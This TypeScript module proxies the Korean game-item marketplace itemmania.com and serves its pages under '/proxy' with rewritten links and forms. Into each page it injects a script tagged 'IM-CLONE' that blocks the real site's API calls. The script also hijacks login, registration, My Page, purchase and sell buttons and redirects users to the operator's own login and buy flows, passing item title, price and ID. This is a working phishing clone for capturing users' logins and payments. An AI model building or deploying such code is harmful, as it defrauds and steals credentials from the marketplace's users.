import * as cheerio from "cheerio";
import { logger } from "./logger";

const ITEMMANIA_BASE = "https://www.itemmania.com";
const MOBILE_ITEMMANIA_BASE = "https://m.itemmania.com";

const UA_DESKTOP = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

function isMobileUA(ua: string): boolean {
  return /android|iphone|ipad|ipod|mobile|blackberry|opera mini/i.test(ua);
}

function getBaseUrl(isMobile: boolean): string {
  return isMobile ? MOBILE_ITEMMANIA_BASE : ITEMMANIA_BASE;
}

// itemmania URL을 우리 프록시 URL로 변환
function rewriteUrl(url: string, isMobile: boolean): string {
  const base = getBaseUrl(isMobile);
  if (url.startsWith(base)) {
    return "/proxy" + url.slice(base.length);
  }
  if (url.startsWith(ITEMMANIA_BASE)) {
    return "/proxy" + url.slice(ITEMMANIA_BASE.length);
  }
  if (url.startsWith(MOBILE_ITEMMANIA_BASE)) {
    return "/proxy" + url.slice(MOBILE_ITEMMANIA_BASE.length);
  }
  if (url.startsWith("//itemmania.com") || url.startsWith("//www.itemmania.com")) {
    return url.replace(/\/\/(www\.)?itemmania\.com/, "/proxy");
  }
  return url;
}

// 주입할 스크립트: 원본 로그인/거래 버튼 가로채기
const INTERCEPT_SCRIPT = `
<script id="__ours__">
(function() {
  // 우리 API 기본 URL
  var API_BASE = '/api';
  var WEB_BASE = '/';

  // fetch 오버라이드: itemmania API 요청 차단
  var _origFetch = window.fetch;
  window.fetch = function(input, init) {
    var url = typeof input === 'string' ? input : (input && input.url) || '';
    if (url.includes('itemmania.com')) {
      console.warn('[IM-CLONE] itemmania fetch 차단:', url);
      return Promise.resolve(new Response(JSON.stringify({ok:false, blocked:true}), {status:200, headers:{'Content-Type':'application/json'}}));
    }
    return _origFetch.apply(this, arguments);
  };

  // XMLHttpRequest 오버라이드
  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string' && url.includes('itemmania.com')) {
      console.warn('[IM-CLONE] XHR 차단:', url);
      arguments[1] = '/api/healthz'; // 무해한 URL로 교체
    }
    return _origOpen.apply(this, arguments);
  };

  // 로그인/회원가입 링크 가로채기
  function interceptLinks() {
    document.querySelectorAll('a').forEach(function(a) {
      var href = a.getAttribute('href') || '';
      var text = a.textContent.trim();

      // 로그인 링크
      if (href.includes('/member/login') || href.includes('login') || text.match(/로그인|Login/i)) {
        a.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          window.location.href = '/?modal=login';
        }, true);
      }

      // 회원가입 링크
      if (href.includes('/member/join') || href.includes('join') || href.includes('register') || text.match(/회원가입|Join/i)) {
        a.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          window.location.href = '/?modal=register';
        }, true);
      }

      // 마이페이지 링크
      if (href.includes('/mypage') || href.includes('/my') || text.match(/마이페이지|My/i)) {
        a.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          window.location.href = '/mypage';
        }, true);
      }
    });

    // 구매/안전거래 버튼 가로채기
    document.querySelectorAll('button, input[type=button], input[type=submit]').forEach(function(btn) {
      var text = btn.textContent ? btn.textContent.trim() : (btn.value || '');
      if (text.match(/구매|안전거래|구매하기|Buy/i)) {
        btn.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          // 상품 정보 수집
          var title = document.title || document.querySelector('h1')?.textContent || '상품';
          var priceEl = document.querySelector('.price, .item-price, [class*=price]');
          var priceText = priceEl ? priceEl.textContent.replace(/[^0-9]/g, '') : '0';
          var price = parseInt(priceText, 10) || 0;
          var itemId = window.location.pathname.split('/').filter(Boolean).pop() || '';

          // 우리 구매 흐름으로 리디렉션
          var params = new URLSearchParams({
            modal: 'buy',
            title: title.substring(0, 100),
            price: String(price),
            itemId: itemId,
            fromProxy: '1'
          });
          window.top.location.href = '/?' + params.toString();
        }, true);
      }
    });

    // 판매 등록 버튼
    document.querySelectorAll('a, button').forEach(function(el) {
      var text = el.textContent ? el.textContent.trim() : '';
      var href = el.getAttribute ? (el.getAttribute('href') || '') : '';
      if (text.match(/판매|아이템판매|Sell/i) || href.includes('/sell')) {
        el.addEventListener('click', function(e) {
          e.preventDefault();
          e.stopPropagation();
          window.top.location.href = '/sell';
        }, true);
      }
    });
  }

  // DOM 로드 후 실행
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', interceptLinks);
  } else {
    interceptLinks();
  }

  // MutationObserver로 동적 추가 요소도 처리
  var observer = new MutationObserver(function() {
    interceptLinks();
  });
  observer.observe(document.body || document.documentElement, { childList: true, subtree: true });
})();
</script>
`;

export async function fetchProxyPage(path: string, userAgent: string): Promise<{ html: string; contentType: string } | null> {
  const isMobile = isMobileUA(userAgent);
  const base = getBaseUrl(isMobile);
  const targetUrl = base + (path.startsWith("/") ? path : "/" + path);

  try {
    const response = await fetch(targetUrl, {
      headers: {
        "User-Agent": isMobile ? userAgent : UA_DESKTOP,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ko-KR,ko;q=0.9,en;q=0.8",
        "Referer": base + "/",
      },
      signal: AbortSignal.timeout(5000),
    });

    const contentType = response.headers.get("content-type") || "text/html";

    if (!contentType.includes("text/html")) {
      // 이미지/CSS/JS 등 바이너리/텍스트 자원은 그대로 패스스루
      return null;
    }

    const html = await response.text();
    return { html, contentType };
  } catch (err) {
    logger.warn({ err, targetUrl }, "프록시 fetch 실패");
    return null;
  }
}

export function injectScript(html: string, isMobile: boolean): string {
  try {
    const $ = cheerio.load(html);

    // <head>에 스크립트 주입
    $("head").append(INTERCEPT_SCRIPT);

    // 상대 URL을 /proxy/... 로 리다이렉트
    $("a[href]").each(function () {
      const href = $(this).attr("href") || "";
      if (href.startsWith("http://www.itemmania.com") || href.startsWith("https://www.itemmania.com") ||
          href.startsWith("http://m.itemmania.com") || href.startsWith("https://m.itemmania.com")) {
        $(this).attr("href", rewriteUrl(href, isMobile));
      } else if (href.startsWith("/") && !href.startsWith("/proxy")) {
        $(this).attr("href", "/proxy" + href);
      }
    });

    // form action 리라이팅
    $("form[action]").each(function () {
      const action = $(this).attr("action") || "";
      if (action.startsWith("/") && !action.startsWith("/proxy")) {
        $(this).attr("action", "/proxy" + action);
      }
    });

    // 이미지 src를 절대 URL로 유지
    $("img[src]").each(function () {
      const src = $(this).attr("src") || "";
      if (src.startsWith("/") && !src.startsWith("//") && !src.startsWith("/proxy")) {
        const base = isMobile ? MOBILE_ITEMMANIA_BASE : ITEMMANIA_BASE;
        $(this).attr("src", base + src);
      }
    });

    return $.html();
  } catch (err) {
    logger.warn({ err }, "HTML 주입 실패, 원본 반환");
    return html;
  }
}
